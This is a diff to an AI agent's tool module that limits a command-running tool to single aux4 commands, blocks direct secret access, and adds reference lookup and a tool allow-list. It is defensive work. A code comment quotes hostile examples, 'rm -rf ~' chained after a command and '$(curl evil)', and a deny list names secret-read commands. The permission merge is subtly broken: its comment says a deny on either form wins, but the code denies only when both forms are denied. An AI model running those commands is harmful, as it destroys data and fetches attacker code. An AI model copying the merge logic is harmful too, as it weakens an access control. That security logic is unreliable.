@@ -499,16 +499,22 @@ function formatTimeoutMessage(command, timeout, error) {
 }
 
 export const executeAux4CliTool = tool(
-  async ({ command, stdin, timeout, cwd }) => {
+  async ({ command: rawCommand, stdin, timeout, cwd }) => {
+    const command = toStrippedForm(rawCommand);
+    const fullCommand = toFullForm(rawCommand);
+
+    const invalid = validateAux4Only(fullCommand);
+    if (invalid) return invalid;
+
     // Check system-level deny first (cannot be overridden)
     for (const pattern of SYSTEM_DENY) {
-      if (matchesPattern(command, pattern)) {
+      if (matchesPattern(command, pattern) || matchesPattern(fullCommand, pattern)) {
         return `Permission denied: command "${command}" is blocked by system security policy. Direct secret access is not allowed. Instead, declare a variable with the secret:// notation in your command's .aux4 definition, and aux4 will resolve it automatically at runtime.\n\nFormat: secret://<provider>/<vault>/<item>/<field>\nOTP:    secret://<provider>/<vault>/<item>/otp\n\nExample variable in .aux4:\n  { "name": "apiKey", "default": "secret://1password/dev/my-api/credential" }\n  { "name": "totpCode", "default": "secret://1password/dev/my-api/otp" }\n\nThe secret is resolved securely and injected into the variable — never call secret get directly.`;
       }
     }
 
     try {
-      const result = await executeWithTimeout(`aux4 ${command}`, { stdin, timeout, cwd });
+      const result = await executeWithTimeout(fullCommand, { stdin, timeout, cwd });
       return result;
     } catch (error) {
       if (error.timedOut) {
@@ -581,19 +587,72 @@ export function checkPermission(subject, permissions = {}) {
 const SYSTEM_DENY = ["secret*get*", "jobs run*op *", "jobs run*secret*get*"];
 
 // Factory that wraps executeAux4 with permission checking
+// `aux4 X` reads as "auxiliary for X", so `aux4 aux4 pkger ...` is auxiliary-for-aux4 and
+// is NOT redundant. Models write the command exactly as it is typed in a terminal (full
+// form) — that matches the man pages and their pretraining, and removes the "did I already
+// say aux4?" ambiguity that made models either drop or double the prefix. The older
+// stripped form (no leading `aux4`) is still accepted so existing agents keep working.
+function toFullForm(command) {
+  const trimmed = (command || "").trim();
+  return /^aux4(\s|$)/.test(trimmed) ? trimmed : `aux4 ${trimmed}`;
+}
+
+function toStrippedForm(command) {
+  const trimmed = (command || "").trim();
+  return trimmed.replace(/^aux4(\s+|$)/, "");
+}
+
+// executeAux4 runs ONLY aux4 commands — never arbitrary CLI. Commands are executed via
+// `sh -c`, so shell control operators would let a caller chain any binary
+// (`aux4 version; rm -rf ~`) or substitute one (`aux4 $(curl evil)`). Reject them: this is
+// the boundary that makes an aux4-only tool safer than a general bash tool.
+const SHELL_CONTROL = /[;&|`\n\r]|\$\(|\$\{|<\(|>|</;
+
+function validateAux4Only(fullCommand) {
+  if (!/^aux4(\s|$)/.test(fullCommand)) {
+    return `Permission denied: executeAux4 runs only aux4 commands, and "${fullCommand}" is not one.`;
+  }
+  if (SHELL_CONTROL.test(fullCommand)) {
+    return `Permission denied: executeAux4 runs only a single aux4 command. Shell operators (; && || | \` $() redirects) are not allowed — run one aux4 command per call.`;
+  }
+  return null;
+}
+
 export const createExecuteAux4Tool = (permissions) => tool(
-  async ({ command, stdin, timeout, cwd }) => {
-    // Check system-level deny first (cannot be overridden)
+  async ({ command: rawCommand, stdin, timeout, cwd }) => {
+    // Full-command form: the model writes the command exactly as typed in a terminal,
+    // including the leading `aux4` ("aux4 X" = auxiliary for X, so `aux4 aux4 pkger ...`
+    // is auxiliary-for-aux4). Legacy stripped form (no leading `aux4`) still works.
+    const command = toStrippedForm(rawCommand);
+    const fullCommand = toFullForm(rawCommand);
+
+    const invalid = validateAux4Only(fullCommand);
+    if (invalid) return invalid;
+
+    // Check system-level deny first (cannot be overridden). Match BOTH forms so a deny
+    // rule written either way still blocks.
     for (const pattern of SYSTEM_DENY) {
-      if (matchesPattern(command, pattern)) {
+      if (matchesPattern(command, pattern) || matchesPattern(fullCommand, pattern)) {
         return `Permission denied: command "${command}" is blocked by system security policy. Direct secret access is not allowed. Instead, declare a variable with the secret:// notation in your command's .aux4 definition, and aux4 will resolve it automatically at runtime.\n\nFormat: secret://<provider>/<vault>/<item>/<field>\nOTP:    secret://<provider>/<vault>/<item>/otp\n\nExample variable in .aux4:\n  { "name": "apiKey", "default": "secret://1password/dev/my-api/credential" }\n  { "name": "totpCode", "default": "secret://1password/dev/my-api/otp" }\n\nThe secret is resolved securely and injected into the variable — never call secret get directly.`;
       }
     }
 
-    const decision = checkPermission(command, permissions);
+    // Permission patterns may be written in either form (stripped, as agents configured
+    // them before; or full, matching what actually runs). Deny wins if EITHER form is
+    // denied; allow needs only one form to match, so existing configs keep working.
+    const strippedDecision = checkPermission(command, permissions);
+    const fullDecision = checkPermission(fullCommand, permissions);
+    const decision =
+      strippedDecision === "deny" && fullDecision === "deny"
+        ? "deny"
+        : strippedDecision === "allow" || fullDecision === "allow"
+          ? "allow"
+          : strippedDecision === "ask" || fullDecision === "ask"
+            ? "ask"
+            : "deny";
 
     if (decision === "deny") {
-      return `Permission denied: command "${command}" is not allowed by the permissions configuration.`;
+      return `Permission denied: command "${fullCommand}" is not allowed by the permissions configuration.`;
     }
 
     if (decision === "ask") {
@@ -626,7 +685,7 @@ export const createExecuteAux4Tool = (permissions) => tool(
     }
 
     try {
-      const result = await executeWithTimeout(`aux4 ${command}`, { stdin, timeout, cwd });
+      const result = await executeWithTimeout(fullCommand, { stdin, timeout, cwd });
       return result;
     } catch (error) {
       if (error.timedOut) {
@@ -1293,41 +1352,55 @@ export const currentDateTimeTool = tool(
   }
 );
 
-export const createReadReferenceTool = (referencesDir) => tool(
+// ai-agent's own built-in references (detailed tool how-tos), shipped in the
+// package at instructions/references. The bundle is CJS, so __dirname resolves
+// to package/lib at runtime; the references sit one level up.
+const BUILTIN_REFERENCES_DIR = path.join(__dirname, "..", "instructions", "references");
+
+export const createReadReferenceTool = (referencesDir, builtinDir = BUILTIN_REFERENCES_DIR) => tool(
   async ({ file }) => {
     try {
-      if (!referencesDir) {
-        return "No references directory configured.";
+      // Resolution order: the configured references dir first, then ai-agent's
+      // built-in references. This lets callers override a reference while the
+      // internal tool how-tos are always available on demand.
+      const dirs = [];
+      if (referencesDir && fs.existsSync(path.resolve(referencesDir))) {
+        dirs.push(path.resolve(referencesDir));
       }
-
-      const resolvedDir = path.resolve(referencesDir);
-
-      if (!fs.existsSync(resolvedDir)) {
-        return "References directory not found.";
+      if (builtinDir && fs.existsSync(path.resolve(builtinDir))) {
+        dirs.push(path.resolve(builtinDir));
+      }
+      if (dirs.length === 0) {
+        return "No references available.";
       }
 
       if (!file) {
-        const files = [];
-        function walk(dir) {
-          for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
-            const full = path.join(dir, entry.name);
-            if (entry.isDirectory()) {
-              walk(full);
-            } else if (entry.name.endsWith(".md")) {
-              files.push(path.relative(resolvedDir, full));
+        const seen = new Set();
+        for (const dir of dirs) {
+          function walk(base, current) {
+            for (const entry of fs.readdirSync(current, { withFileTypes: true })) {
+              const full = path.join(current, entry.name);
+              if (entry.isDirectory()) {
+                walk(base, full);
+              } else if (entry.name.endsWith(".md")) {
+                seen.add(path.relative(base, full));
+              }
             }
           }
+          walk(dir, dir);
         }
-        walk(resolvedDir);
-        if (files.length === 0) return "No reference documents found.";
-        return files.join("\n");
+        if (seen.size === 0) return "No reference documents found.";
+        return [...seen].sort().join("\n");
       }
 
-      const filePath = path.resolve(resolvedDir, file);
-      if (!filePath.startsWith(resolvedDir)) return "Access denied";
-      if (!fs.existsSync(filePath)) return `Reference "${file}" not found.`;
-
-      return fs.readFileSync(filePath, { encoding: "utf-8" });
+      for (const dir of dirs) {
+        const filePath = path.resolve(dir, file);
+        if (!filePath.startsWith(dir)) continue; // path traversal guard
+        if (fs.existsSync(filePath)) {
+          return fs.readFileSync(filePath, { encoding: "utf-8" });
+        }
+      }
+      return `Reference "${file}" not found.`;
     } catch (e) {
       return e.message;
     }
@@ -1529,7 +1602,7 @@ function wrapWithPolicy(name, underlyingTool, policy, getUsage) {
 }
 
 export function createTools(config = {}) {
-  const { storage, embeddingsConfig, permissions, references, skills, policy, getUsage } = config;
+  const { storage, embeddingsConfig, permissions, references, skills, policy, getUsage, tools } = config;
 
   const base = {
     readFile: permissions ? createReadFileTool(permissions) : readLocalFileTool,
@@ -1548,13 +1621,24 @@ export function createTools(config = {}) {
     readSkill: createReadSkillTool(skills)
   };
 
-  if (!policy) return base;
-
-  // Gate only the consequential tools; read-only tools stay exempt.
-  const CONSEQUENTIAL = ["executeAux4", "writeFile", "editFile", "removeFiles", "createDirectory", "saveImage"];
-  for (const name of CONSEQUENTIAL) {
-    base[name] = wrapWithPolicy(name, base[name], policy, getUsage);
+  if (policy) {
+    // Gate only the consequential tools; read-only tools stay exempt.
+    const CONSEQUENTIAL = ["executeAux4", "writeFile", "editFile", "removeFiles", "createDirectory", "saveImage"];
+    for (const name of CONSEQUENTIAL) {
+      base[name] = wrapWithPolicy(name, base[name], policy, getUsage);
+    }
   }
+
+  // Optional allow-list: bind only the named tools. Shrinks the per-request tool-description
+  // floor (each unbound tool's schema is not sent to the model). Unknown names are ignored.
+  if (Array.isArray(tools) && tools.length > 0) {
+    const selected = {};
+    for (const name of tools) {
+      if (base[name]) selected[name] = base[name];
+    }
+    return Object.keys(selected).length > 0 ? selected : base;
+  }
+
   return base;
 }
 
